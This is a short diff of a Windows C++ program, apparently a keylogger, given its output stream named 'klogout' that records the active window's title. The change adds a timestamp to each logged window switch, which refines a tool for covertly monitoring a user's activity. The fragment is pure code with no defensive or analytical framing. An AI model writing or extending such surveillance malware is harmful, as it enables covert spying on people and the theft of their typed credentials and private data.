@@ -26,6 +26,7 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR lpCmdLin
 	struct tm *timeinfo;
 	time(&rawtime);
 	timeinfo = localtime(&rawtime);
+  char timestamp[80];
 	char filename[MAX_PATH];
 	char filepath[MAX_PATH];
 	strftime(filename, 100, "%Y-%m-%d_%H-%M-%S", timeinfo);
@@ -43,8 +44,12 @@ int APIENTRY WinMain(HINSTANCE hInstance,HINSTANCE hPrevInstance,LPTSTR lpCmdLin
 		char title[1024];
 		HWND hwndHandle = GetForegroundWindow();
 		GetWindowText(hwndHandle, title, 1023);
-		if(lastTitle != title){
-			klogout << endl << endl << "Window: ";
+    // Get latest timestamp
+    time(&rawtime);
+    timeinfo = localtime(&rawtime);
+    strftime(timestamp, 80, "%H:%M:%S", timeinfo);
+    if(lastTitle != title){
+			klogout << endl << endl << timestamp << " Window: ";
 			if(strlen(title) == 0)
 				klogout << "NO ACTIVE WINDOW";
 			else
